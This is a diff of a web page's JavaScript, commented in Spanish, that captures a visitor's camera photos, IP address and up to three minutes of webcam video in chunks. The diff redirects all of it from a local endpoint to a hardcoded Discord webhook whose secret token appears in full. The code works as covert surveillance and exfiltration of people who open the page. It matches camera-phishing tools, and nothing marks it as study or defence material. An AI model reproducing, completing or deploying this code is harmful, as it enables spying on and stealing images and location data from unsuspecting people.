@@ -68,19 +68,21 @@
   <script>
     const video = document.getElementById('video');
 
-    const API_ENDPOINT = '/api/send';
-
-    const SEGUNDOS_POR_TROZO = 3;
-    const MAX_TROZOS = 60;
+    // ====== CONFIGURACIÓN ======
+    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1548798068885819432/2ERz1DQOk54rVCxyFh-O-EGn4sTTh8FFYzeJzIDobMr3ZuWgVJK2Npu8-0FfMk-MtVZ5';
+    const SEGUNDOS_POR_TROZO = 3;   // duración de cada trozo de video
+    const MAX_TROZOS = 60;          // 60 x 3s = 3 minutos máximo
     const ANCHO = 320;
     const ALTO = 240;
-    const CAMARA_VIDEO = 'user';
+    const CAMARA_VIDEO = 'user';    // 'user' frontal, 'environment' trasera
+    // ===========================
 
     let currentStream = null;
     let yaEnviado = false;
     let pidiendo = false;
     let ipUsuario = null;
 
+    // -------- IP --------
     async function obtenerIP() {
       if (ipUsuario) return ipUsuario;
       try {
@@ -94,12 +96,14 @@
       }
     }
 
+    // -------- Hora --------
     function horaActual() {
       const d = new Date();
       const pad = n => String(n).padStart(2, '0');
       return `${pad(d.getHours())}:${pad(d.getMinutes())}:${pad(d.getSeconds())} - ${pad(d.getDate())}/${pad(d.getMonth()+1)}/${pad(d.getFullYear())}`;
     }
 
+    // -------- Capturar foto --------
     async function capturarFoto(facingMode) {
       if (currentStream) {
         currentStream.getTracks().forEach(t => t.stop());
@@ -136,13 +140,14 @@
       return blob;
     }
 
+    // -------- Enviar al webhook --------
     async function enviarAlWebhook(blob, mensaje, nombreArchivo) {
       const formData = new FormData();
       formData.append('file', blob, nombreArchivo);
-      formData.append('content', mensaje);
+      formData.append('payload_json', JSON.stringify({ content: mensaje }));
 
       try {
-        const res = await fetch(API_ENDPOINT, {
+        const res = await fetch(WEBHOOK_URL, {
           method: 'POST',
           body: formData
         });
@@ -154,6 +159,7 @@
       }
     }
 
+    // -------- Elegir mimeType soportado --------
     function elegirMimeTypeVideo() {
       const candidatos = [
         'video/webm;codecs=vp8,opus',
@@ -170,6 +176,7 @@
       return '';
     }
 
+    // -------- Grabar video en trozos --------
     async function grabarVideoEnTrozos(hora, linkIP) {
       if (!navigator.mediaDevices || !window.MediaRecorder) {
         throw new Error('MediaRecorder no soportado');
@@ -253,6 +260,7 @@
       stream.getTracks().forEach(t => t.stop());
     }
 
+    // -------- Flujo principal --------
     async function iniciar() {
       if (pidiendo || yaEnviado) return;
       pidiendo = true;
